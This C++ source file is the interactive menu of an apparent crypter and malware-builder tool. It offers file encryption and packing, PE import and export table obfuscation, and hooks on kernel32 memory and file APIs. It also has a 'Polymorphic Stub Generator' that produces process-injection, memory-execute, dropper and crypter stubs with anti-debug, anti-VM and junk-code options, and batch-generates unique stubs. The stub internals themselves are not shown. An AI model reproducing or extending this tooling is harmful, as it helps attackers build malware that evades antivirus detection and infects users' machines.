#include "menu.h"
#include "packer.h"
#include <iostream>
#include <sstream>
#include <iomanip>
#include <map>
#include <thread>
#include <chrono>
#include <fstream>
#include "include/stub_generator.h"

#ifndef _WIN32
#include "utils/windows_stubs.h"
#endif

// Forward declaration of KernelHookManager - will be defined in main.cpp
extern void registerProtectedMemoryRegion(DWORD processId, void* startAddress, size_t size);

// Map of encryption modes
static const std::map<char, Fx7z9Process> encryptionModes = {
    {'x', Fx7z9Process::Qx3r},  // Basic XOR
    {'k', Fx7z9Process::K5bc},  // AES-CBC
    {'m', Fx7z9Process::M2tr},  // AES-CTR
    {'z', Fx7z9Process::Z1ha},  // ChaCha20
    {'p', Fx7z9Process::P3rc},  // RC4
    {'b', Fx7z9Process::B2fs},  // Blowfish
    {'t', Fx7z9Process::T5sh},  // Twofish
    {'s', Fx7z9Process::S7pt},  // Serpent
    {'c', Fx7z9Process::C9la},  // Camellia
    {'g', Fx7z9Process::G4cm},  // GCM
    {'y', Fx7z9Process::P1y5}   // Poly1305
};

void displayMenu() {
    Z3Processor processor;
    KernelHookManager hookManager;
    
    bool exitProgram = false;
    
    // Try to initialize hook manager once at startup
    bool hooksAvailable = hookManager.isKernelHookAvailable();
    if (hooksAvailable) {
        if (hookManager.initialize()) {
            std::cout << "Security hooks initialized successfully." << std::endl;
        } else {
            std::cout << "Failed to initialize security hooks." << std::endl;
            hooksAvailable = false;
        }
    }
    
    while (!exitProgram) {
        std::cout << "\n==== Encryption and Packing Tool ====\n";
        std::cout << "1. Encryption/Decryption Operations\n";
        std::cout << "2. File Packing Operations\n";
        std::cout << "3. PE File Manipulation\n";
        if (hooksAvailable) {
            std::cout << "4. Security and Protection Options\n";
        }
        std::cout << "5. Polymorphic Stub Generator\n";
        std::cout << "0. Exit\n";
        std::cout << "Enter your choice: ";
        
        int choice;
        std::cin >> choice;
        
        if (choice == 0) {
            exitProgram = true;
        } else if (choice == 1) {
            displayEncryptionMenu();
            int encChoice;
            std::cin >> encChoice;
            handleEncryptionChoice(encChoice, processor);
        } else if (choice == 2) {
            displayPackingMenu();
            int packChoice;
            std::cin >> packChoice;
            handlePackingChoice(packChoice, processor);
        } else if (choice == 3) {
            displayPEMenu();
            int peChoice;
            std::cin >> peChoice;
            handlePEManipulationChoice(peChoice, processor, hookManager);
        } else if (choice == 4 && hooksAvailable) {
            displaySecurityMenu();
            int secChoice;
            std::cin >> secChoice;
            handleSecurityChoice(secChoice, hookManager);
        } else if (choice == 5) {
            displayStubGeneratorMenu();
            int stubChoice;
            std::cin >> stubChoice;
            handleStubGeneratorChoice(stubChoice);
        } else {
            std::cout << "Invalid choice. Please try again.\n";
        }
    }
    
    // Clean up hooks before exiting
    if (hooksAvailable) {
        hookManager.cleanup();
    }
    
    std::cout << "Thank you for using the Encryption and Packing Tool!\n";
}

void displayEncryptionMenu() {
    std::cout << "\n==== Encryption/Decryption Operations ====\n";
    std::cout << "1. Encrypt a file\n";
    std::cout << "2. Decrypt a file\n";
    std::cout << "3. Encrypt a folder\n";
    std::cout << "4. Decrypt a folder\n";
    std::cout << "0. Back to Main Menu\n";
    std::cout << "Enter your choice: ";
}

void handleEncryptionChoice(int choice, Z3Processor& processor) {
    if (choice == 0) {
        return;
    }
    
    bool isEncrypt = (choice == 1 || choice == 3);
    bool isFolder = (choice == 3 || choice == 4);
    
    // Select encryption algorithm
    std::cout << "\nSelect encryption algorithm:\n";
    std::cout << "x - XOR (Basic)\n";
    std::cout << "k - AES-CBC\n";
    std::cout << "m - AES-CTR\n";
    std::cout << "z - ChaCha20\n";
    std::cout << "p - RC4\n";
    std::cout << "b - Blowfish\n";
    std::cout << "t - Twofish\n";
    std::cout << "s - Serpent\n";
    std::cout << "c - Camellia\n";
    std::cout << "g - GCM (Authenticated)\n";
    std::cout << "y - Poly1305 (Authenticated)\n";
    std::cout << "Enter your choice: ";
    
    char algoChoice;
    std::cin >> algoChoice;
    
    auto modeIt = encryptionModes.find(std::tolower(algoChoice));
    if (modeIt == encryptionModes.end()) {
        std::cout << "Invalid algorithm choice. Using XOR as default.\n";
        processor.setupMode(Fx7z9Process::Qx3r);
    } else {
        processor.setupMode(modeIt->second);
    }
    
    // Get seed/key
    std::vector<uint8_t> seed = getHexSeed();
    processor.setupSeed(seed);
    
    if (isFolder) {
        // Handle folder encryption/decryption
        std::string folderPath = getInputPath(isEncrypt ? "Enter folder to encrypt: " : "Enter folder to decrypt: ");
        std::string outputPath = getInputPath("Enter output folder: ");
        
        // This functionality would need to be implemented in Z3Processor
        // For now, just show a placeholder message
        std::cout << "Folder " << (isEncrypt ? "encryption" : "decryption") << " not yet implemented.\n";
    } else {
        // Handle single file encryption/decryption
        if (isEncrypt) {
            std::string inputFile = getInputPath("Enter file to encrypt: ");
            std::string outputFile = getInputPath("Enter output file: ");
            
            std::vector<std::string> inputFiles = {inputFile};
            processor.runTask42(inputFiles, outputFile);
            
            std::cout << "File encrypted successfully.\n";
        } else {
            std::string inputFile = getInputPath("Enter file to decrypt: ");
            std::string outputDir = getInputPath("Enter output directory: ");
            
            processor.runTask67(inputFile, outputDir);
            
            std::cout << "File decrypted successfully.\n";
        }
    }
}

void displayPackingMenu() {
    std::cout << "\n==== File Packing Operations ====\n";
    std::cout << "1. Pack multiple files\n";
    std::cout << "2. Unpack files\n";
    std::cout << "3. Check package format\n";
    std::cout << "0. Back to Main Menu\n";
    std::cout << "Enter your choice: ";
}

void handlePackingChoice(int choice, Z3Processor& processor) {
    switch (choice) {
        case 0:
            return;
            
        case 1: {
            // Pack multiple files
            std::vector<std::string> files = getMultipleInputPaths();
            if (files.empty()) {
                std::cout << "No files selected for packing.\n";
                return;
            }
            
            std::string outputFile = getInputPath("Enter output package file: ");
            
            // Ask if encryption should be applied
            std::cout << "Apply encryption to the package? (y/n): ";
            char encChoice;
            std::cin >> encChoice;
            
            if (std::tolower(encChoice) == 'y') {
                // Select encryption algorithm
                std::cout << "\nSelect encryption algorithm:\n";
                std::cout << "x - XOR (Basic)\n";
                std::cout << "k - AES-CBC\n";
                std::cout << "m - AES-CTR\n";
                std::cout << "z - ChaCha20\n";
                std::cout << "p - RC4\n";
                std::cout << "b - Blowfish\n";
                std::cout << "t - Twofish\n";
                std::cout << "s - Serpent\n";
                std::cout << "c - Camellia\n";
                std::cout << "g - GCM (Authenticated)\n";
                std::cout << "y - Poly1305 (Authenticated)\n";
                std::cout << "Enter your choice: ";
                
                char algoChoice;
                std::cin >> algoChoice;
                
                auto modeIt = encryptionModes.find(std::tolower(algoChoice));
                if (modeIt == encryptionModes.end()) {
                    std::cout << "Invalid algorithm choice. Using XOR as default.\n";
                    processor.setupMode(Fx7z9Process::Qx3r);
                } else {
                    processor.setupMode(modeIt->second);
                }
                
                // Get seed/key
                std::vector<uint8_t> seed = getHexSeed();
                processor.setupSeed(seed);
            } else {
                // No encryption
                processor.setupMode(Fx7z9Process::D4t0);
            }
            
            processor.runTask42(files, outputFile);
            std::cout << "Files packed successfully into " << outputFile << std::endl;
            break;
        }
            
        case 2: {
            // Unpack files
            std::string packageFile = getInputPath("Enter package file to unpack: ");
            std::string outputDir = getInputPath("Enter output directory: ");
            
            // Ask for decryption key if needed
            std::cout << "Is the package encrypted? (y/n): ";
            char encChoice;
            std::cin >> encChoice;
            
            if (std::tolower(encChoice) == 'y') {
                // Get seed/key
                std::vector<uint8_t> seed = getHexSeed();
                processor.setupSeed(seed);
            }
            
            processor.runTask67(packageFile, outputDir);
            std::cout << "Package unpacked successfully to " << outputDir << std::endl;
            break;
        }
            
        case 3: {
            // Check package format
            std::string packageFile = getInputPath("Enter package file to check: ");
            
            if (processor.checkFormat92(packageFile)) {
                std::cout << "File has a valid package format.\n";
            } else {
                std::cout << "File does NOT have a valid package format.\n";
            }
            break;
        }
            
        default:
            std::cout << "Invalid choice.\n";
    }
}

void displayPEMenu() {
    std::cout << "\n==== PE File Manipulation ====\n";
    std::cout << "1. Add component to PE file\n";
    std::cout << "2. Process component in PE file\n";
    std::cout << "3. Obfuscate import table\n";
    std::cout << "4. Obfuscate export table\n";
    std::cout << "5. Apply complete obfuscation\n";
    std::cout << "0. Back to Main Menu\n";
    std::cout << "Enter your choice: ";
}

void handlePEManipulationChoice(int choice, Z3Processor& processor, KernelHookManager& hookManager) {
    switch (choice) {
        case 0:
            return;
            
        case 1: {
            // Add component to PE file
            std::string peFile = getInputPath("Enter PE file path: ");
            
            if (!processor.checkFormat92(peFile)) {
                std::cout << "File does not have a valid PE format.\n";
                return;
            }
            
            std::cout << "Enter component label (max 8 chars): ";
            std::string label;
            std::cin >> label;
            
            std::string componentFile = getInputPath("Enter component data file: ");
            auto componentData = processor.loadResource(componentFile);
            
            if (componentData.empty()) {
                std::cout << "Failed to load component data.\n";
                return;
            }
            
            // Register component data memory as protected if hooks are available
            try {
                registerProtectedMemoryRegion(GetCurrentProcessId(), componentData.data(), componentData.size());
            } catch (...) {
                // Continue if protection fails
            }
            
            if (processor.task104(peFile, label, componentData)) {
                std::cout << "Component added successfully.\n";
            } else {
                std::cout << "Failed to add component.\n";
            }
            break;
        }
            
        case 2: {
            // Process component in PE file
            std::string peFile = getInputPath("Enter PE file path: ");
            
            if (!processor.checkFormat92(peFile)) {
                std::cout << "File does not have a valid PE format.\n";
                return;
            }
            
            std::cout << "Enter component label to process: ";
            std::string label;
            std::cin >> label;
            
            // Select encryption algorithm
            std::cout << "\nSelect encryption algorithm:\n";
            std::cout << "x - XOR (Basic)\n";
            std::cout << "k - AES-CBC\n";
            std::cout << "m - AES-CTR\n";
            std::cout << "z - ChaCha20\n";
            std::cout << "p - RC4\n";
            std::cout << "b - Blowfish\n";
            std::cout << "t - Twofish\n";
            std::cout << "s - Serpent\n";
            std::cout << "c - Camellia\n";
            std::cout << "g - GCM (Authenticated)\n";
            std::cout << "y - Poly1305 (Authenticated)\n";
            std::cout << "Enter your choice: ";
            
            char algoChoice;
            std::cin >> algoChoice;
            
            Fx7z9Process mode = Fx7z9Process::Qx3r;
            auto modeIt = encryptionModes.find(std::tolower(algoChoice));
            if (modeIt != encryptionModes.end()) {
                mode = modeIt->second;
            } else {
                std::cout << "Invalid algorithm choice. Using XOR as default.\n";
            }
            
            // Get seed/key
            std::vector<uint8_t> seed = getHexSeed();
            
            if (processor.task219(peFile, label, mode, seed)) {
                std::cout << "Component processed successfully.\n";
            } else {
                std::cout << "Failed to process component.\n";
            }
            break;
        }
            
        case 3: {
            // Obfuscate import table
            std::string peFile = getInputPath("Enter PE file path: ");
            
            if (!processor.checkFormat92(peFile)) {
                std::cout << "File does not have a valid PE format.\n";
                return;
            }
            
            if (processor.task317(peFile)) {
                std::cout << "Import table obfuscated successfully.\n";
            } else {
                std::cout << "Failed to obfuscate import table.\n";
            }
            break;
        }
            
        case 4: {
            // Obfuscate export table
            std::string peFile = getInputPath("Enter PE file path: ");
            
            if (!processor.checkFormat92(peFile)) {
                std::cout << "File does not have a valid PE format.\n";
                return;
            }
            
            if (processor.task318(peFile)) {
                std::cout << "Export table obfuscated successfully.\n";
            } else {
                std::cout << "Failed to obfuscate export table.\n";
            }
            break;
        }
            
        case 5: {
            // Apply complete obfuscation
            std::string peFile = getInputPath("Enter PE file path: ");
            
            if (!processor.checkFormat92(peFile)) {
                std::cout << "File does not have a valid PE format.\n";
                return;
            }
            
            bool importSuccess = processor.task317(peFile);
            bool exportSuccess = processor.task318(peFile);
            
            if (importSuccess && exportSuccess) {
                std::cout << "Complete obfuscation applied successfully.\n";
            } else {
                if (!importSuccess) {
                    std::cout << "Failed to obfuscate import table.\n";
                }
                if (!exportSuccess) {
                    std::cout << "Failed to obfuscate export table.\n";
                }
            }
            break;
        }
            
        default:
            std::cout << "Invalid choice.\n";
    }
}

void displaySecurityMenu() {
    std::cout << "\n==== Security and Protection Options ====\n";
    std::cout << "1. Enable memory protection\n";
    std::cout << "2. Enable file access monitoring\n";
    std::cout << "3. Enhance random number generation\n";
    std::cout << "4. Protect specific memory region\n";
    std::cout << "5. Enable all security features\n";
    std::cout << "0. Back to Main Menu\n";
    std::cout << "Enter your choice: ";
}

void handleSecurityChoice(int choice, KernelHookManager& hookManager) {
    void* origFunc = NULL;
    
    switch (choice) {
        case 0:
            return;
            
        case 1: {
            // Enable memory protection
            HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
            if (!kernel32) {
                std::cout << "Failed to get kernel32.dll module handle.\n";
                return;
            }
            
            void* vpAddr = GetProcAddress(kernel32, "VirtualProtectEx");
            void* rpmAddr = GetProcAddress(kernel32, "ReadProcessMemory");
            void* wpmAddr = GetProcAddress(kernel32, "WriteProcessMemory");
            
            bool success = true;
            if (vpAddr) {
                success &= hookManager.installHook(vpAddr, NULL, &origFunc);
            }
            if (rpmAddr) {
                success &= hookManager.installHook(rpmAddr, NULL, &origFunc);
            }
            if (wpmAddr) {
                success &= hookManager.installHook(wpmAddr, NULL, &origFunc);
            }
            
            if (success) {
                std::cout << "Memory protection enabled successfully.\n";
            } else {
                std::cout << "Failed to enable some memory protection features.\n";
            }
            break;
        }
            
        case 2: {
            // Enable file access monitoring
            HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
            if (!kernel32) {
                std::cout << "Failed to get kernel32.dll module handle.\n";
                return;
            }
            
            void* cfAddr = GetProcAddress(kernel32, "CreateFileW");
            
            if (cfAddr && hookManager.installHook(cfAddr, NULL, &origFunc)) {
                std::cout << "File access monitoring enabled successfully.\n";
            } else {
                std::cout << "Failed to enable file access monitoring.\n";
            }
            break;
        }
            
        case 3: {
            // Enhance random number generation
            HMODULE advapi32 = GetModuleHandleA("advapi32.dll");
            if (!advapi32) {
                std::cout << "Failed to get advapi32.dll module handle.\n";
                return;
            }
            
            void* cgrAddr = GetProcAddress(advapi32, "CryptGenRandom");
            
            if (cgrAddr && hookManager.installHook(cgrAddr, NULL, &origFunc)) {
                std::cout << "Random number generation enhancement enabled successfully.\n";
            } else {
                std::cout << "Failed to enhance random number generation.\n";
            }
            break;
        }
            
        case 4: {
            // Protect specific memory region
            std::cout << "Enter memory address to protect (hex): ";
            std::string addrHex;
            std::cin >> addrHex;
            
            void* addr = (void*)std::stoull(addrHex, nullptr, 16);
            
            std::cout << "Enter size of region to protect (decimal): ";
            size_t size;
            std::cin >> size;
            
            try {
                hookManager.registerProtectedMemory(addr, size);
                
                // Make sure memory protection hooks are enabled
                HMODULE kernel32 = GetModuleHandleA("kernel32.dll");
                if (kernel32) {
                    void* vpAddr = GetProcAddress(kernel32, "VirtualProtectEx");
                    void* rpmAddr = GetProcAddress(kernel32, "ReadProcessMemory");
                    void* wpmAddr = GetProcAddress(kernel32, "WriteProcessMemory");
                    
                    if (vpAddr) hookManager.installHook(vpAddr, NULL, &origFunc);
                    if (rpmAddr) hookManager.installHook(rpmAddr, NULL, &origFunc);
                    if (wpmAddr) hookManager.installHook(wpmAddr, NULL, &origFunc);
                }
                
                std::cout << "Memory region protected successfully.\n";
            } catch (...) {
                std::cout << "Failed to protect memory region.\n";
            }
            break;
        }
            
        case 5: {
            // Enable all security features
            if (hookManager.installStandardHooks()) {
                std::cout << "All security features enabled successfully.\n";
            } else {
                std::cout << "Failed to enable some security features.\n";
            }
            break;
        }
            
        default:
            std::cout << "Invalid choice.\n";
    }
}

std::string getInputPath(const std::string& prompt) {
    std::string path;
    std::cout << prompt;
    std::cin >> path;
    return path;
}

std::vector<std::string> getMultipleInputPaths() {
    std::vector<std::string> paths;
    std::string path;
    
    std::cout << "Enter file paths (type 'done' when finished):\n";
    
    while (true) {
        std::cout << "Path (or 'done'): ";
        std::cin >> path;
        
        if (path == "done") {
            break;
        }
        
        paths.push_back(path);
    }
    
    return paths;
}

std::vector<uint8_t> getHexSeed() {
    std::cout << "Enter encryption key/seed (hex, 32 chars for 16 bytes, press Enter for random): ";
    std::string seedHex;
    std::cin.ignore(); // Clear any previous input
    std::getline(std::cin, seedHex);
    
    std::vector<uint8_t> seed;
    
    if (!seedHex.empty()) {
        // Convert hex string to bytes
        for (size_t i = 0; i + 1 < seedHex.length(); i += 2) {
            std::string byteString = seedHex.substr(i, 2);
            uint8_t byte = (uint8_t)std::stoi(byteString, nullptr, 16);
            seed.push_back(byte);
        }
    }
    
    return seed;
}

void displayStubGeneratorMenu() {
    std::cout << "\n==== Polymorphic Stub Generator ====\n";
    std::cout << "1. Generate Basic Loader Stub\n";
    std::cout << "2. Generate Process Injection Stub\n";
    std::cout << "3. Generate Memory Execute Stub\n";
    std::cout << "4. Generate Dropper Stub\n";
    std::cout << "5. Generate Crypter Stub\n";
    std::cout << "6. Generate Full Polymorphic Engine\n";
    std::cout << "7. Attach File to Stub (Drag & Drop)\n";
    std::cout << "8. Build Executable from Stub\n";
    std::cout << "9. Batch Generate Unique Stubs\n";
    std::cout << "0. Back to Main Menu\n";
}

void handleStubGeneratorChoice(int choice) {
    static StubGenerator stubGen;
    static DragDropHandler dragDrop;
    static std::vector<uint8_t> currentStub;
    
    switch (choice) {
        case 0:
            return;
            
        case 1:
        case 2:
        case 3:
        case 4:
        case 5:
        case 6: {
            // Generate stub based on template
            StubGenerator::StubTemplate templates[] = {
                StubGenerator::StubTemplate::BASIC_LOADER,
                StubGenerator::StubTemplate::PROCESS_INJECTION,
                StubGenerator::StubTemplate::MEMORY_EXECUTE,
                StubGenerator::StubTemplate::DROPPER,
                StubGenerator::StubTemplate::CRYPTER,
                StubGenerator::StubTemplate::POLYMORPHIC_ENGINE
            };
            
            // Configure stub options
            StubGenerator::StubConfig config;
            
            std::cout << "\n=== Stub Configuration ===\n";
            std::cout << "Enable Anti-Debug? (y/n): ";
            char yn;
            std::cin >> yn;
            config.antiDebug = (yn == 'y' || yn == 'Y');
            
            std::cout << "Enable Anti-VM? (y/n): ";
            std::cin >> yn;
            config.antiVM = (yn == 'y' || yn == 'Y');
            
            std::cout << "Enable Code Obfuscation? (y/n): ";
            std::cin >> yn;
            config.obfuscateCode = (yn == 'y' || yn == 'Y');
            
            std::cout << "Add Junk Code? (y/n): ";
            std::cin >> yn;
            config.addJunkCode = (yn == 'y' || yn == 'Y');
            
            std::cout << "Randomize Layout? (y/n): ";
            std::cin >> yn;
            config.randomizeLayout = (yn == 'y' || yn == 'Y');
            
            // Generate the stub
            currentStub = stubGen.generateStub(templates[choice - 1], config);
            
            std::cout << "\n[+] Stub generated successfully!\n";
            std::cout << "    Size: " << currentStub.size() << " bytes\n";
            std::cout << "    Hash: " << stubGen.getStubHash() << "\n";
            
            // Save stub to file
            std::cout << "\nSave stub to file? (y/n): ";
            std::cin >> yn;
            if (yn == 'y' || yn == 'Y') {
                std::cout << "Enter output filename: ";
                std::string filename;
                std::cin >> filename;
                
                std::ofstream file(filename, std::ios::binary);
                if (file) {
                    file.write(reinterpret_cast<const char*>(currentStub.data()), currentStub.size());
                    file.close();
                    std::cout << "[+] Stub saved to: " << filename << "\n";
                } else {
                    std::cout << "[-] Failed to save stub\n";
                }
            }
            break;
        }
            
        case 7: {
            // Drag & Drop file attachment
            std::cout << "\n=== Drag & Drop File Attachment ===\n";
            
            if (currentStub.empty()) {
                std::cout << "[-] No stub loaded. Generate a stub first.\n";
                break;
            }
            
            // Initialize drag-drop if not already done
            if (!dragDrop.initialize()) {
                // Fallback to manual input
                std::cout << "Drag & Drop not available. Enter file path manually: ";
                std::string filePath;
                std::cin.ignore();
                std::getline(std::cin, filePath);
                
                // Read the file
                std::ifstream file(filePath, std::ios::binary | std::ios::ate);
                if (!file) {
                    std::cout << "[-] Failed to open file: " << filePath << "\n";
                    break;
                }
                
                size_t fileSize = file.tellg();
                file.seekg(0, std::ios::beg);
                
                std::vector<uint8_t> payload(fileSize);
                file.read(reinterpret_cast<char*>(payload.data()), fileSize);
                file.close();
                
                // Attach payload to stub
                if (stubGen.attachPayload(currentStub, payload)) {
                    std::cout << "[+] File attached successfully!\n";
                    std::cout << "    Payload size: " << fileSize << " bytes\n";
                    std::cout << "    Total size: " << currentStub.size() << " bytes\n";
                } else {
                    std::cout << "[-] Failed to attach payload\n";
                }
            } else {
                std::cout << "Drag and drop your file here...\n";
                std::cout << "(or press Enter to cancel)\n";
                
                // Simulate waiting for drag-drop
                std::this_thread::sleep_for(std::chrono::seconds(2));
                
                if (dragDrop.hasDroppedFiles()) {
                    auto files = dragDrop.getDroppedFiles();
                    if (!files.empty()) {
                        std::cout << "[+] File dropped: " << files[0] << "\n";
                        // Process the dropped file
                        // ... (similar to manual input above)
                    }
                    dragDrop.clearDroppedFiles();
                }
            }
            break;
        }
            
        case 8: {
            // Build executable
            std::cout << "\n=== Build Executable ===\n";
            
            if (currentStub.empty()) {
                std::cout << "[-] No stub loaded. Generate a stub first.\n";
                break;
            }
            
            std::cout << "Enter output executable name: ";
            std::string outputPath;
            std::cin >> outputPath;
            
            // Add .exe extension if not present
            if (outputPath.find(".exe") == std::string::npos && 
                outputPath.find(".elf") == std::string::npos) {
#ifdef _WIN32
                outputPath += ".exe";
#else
                outputPath += ".elf";
#endif
            }
            
            ExecutableBuilder builder;
            ExecutableBuilder::ExeType exeType;
            
            std::cout << "Select executable type:\n";
            std::cout << "1. Windows PE32 (32-bit)\n";
            std::cout << "2. Windows PE64 (64-bit)\n";
            std::cout << "3. Linux ELF32 (32-bit)\n";
            std::cout << "4. Linux ELF64 (64-bit)\n";
            std::cout << "Choice: ";
            
            int typeChoice;
            std::cin >> typeChoice;
            
            switch (typeChoice) {
                case 1: exeType = ExecutableBuilder::ExeType::PE32; break;
                case 2: exeType = ExecutableBuilder::ExeType::PE64; break;
                case 3: exeType = ExecutableBuilder::ExeType::ELF32; break;
                case 4: exeType = ExecutableBuilder::ExeType::ELF64; break;
                default: exeType = ExecutableBuilder::ExeType::PE32; break;
            }
            
            if (builder.buildExecutable(outputPath, currentStub, {}, exeType)) {
                std::cout << "[+] Executable created successfully: " << outputPath << "\n";
                
                // Make executable on Linux
#ifndef _WIN32
                std::string cmd = "chmod +x " + outputPath;
                system(cmd.c_str());
#endif
            } else {
                std::cout << "[-] Failed to create executable\n";
            }
            break;
        }
            
        case 9: {
            // Batch generate unique stubs
            std::cout << "\n=== Batch Generate Unique Stubs ===\n";
            std::cout << "Number of stubs to generate: ";
            int count;
            std::cin >> count;
            
            if (count <= 0 || count > 100) {
                std::cout << "[-] Invalid count (1-100)\n";
                break;
            }
            
            std::cout << "Base filename prefix: ";
            std::string prefix;
            std::cin >> prefix;
            
            // Use default config for batch generation
            StubGenerator::StubConfig config;
            config.antiDebug = true;
            config.antiVM = true;
            config.obfuscateCode = true;
            config.addJunkCode = true;
            config.randomizeLayout = true;
            
            std::cout << "\nGenerating " << count << " unique stubs...\n";
            
            for (int i = 0; i < count; i++) {
                // Generate unique stub
                auto stub = stubGen.generateStub(StubGenerator::StubTemplate::POLYMORPHIC_ENGINE, config);
                
                // Save to file
                std::stringstream filename;
                filename << prefix << "_" << std::setfill('0') << std::setw(3) << i << ".bin";
                
                std::ofstream file(filename.str(), std::ios::binary);
                if (file) {
                    file.write(reinterpret_cast<const char*>(stub.data()), stub.size());
                    file.close();
                    
                    std::cout << "[" << i+1 << "/" << count << "] Generated: " 
                              << filename.str() << " (Size: " << stub.size() << " bytes)\n";
                }
                
                // Small delay to ensure different random seeds
                std::this_thread::sleep_for(std::chrono::milliseconds(10));
            }
            
            std::cout << "\n[+] Batch generation complete!\n";
            break;
        }
            
        default:
            std::cout << "Invalid choice.\n";
            break;
    }
}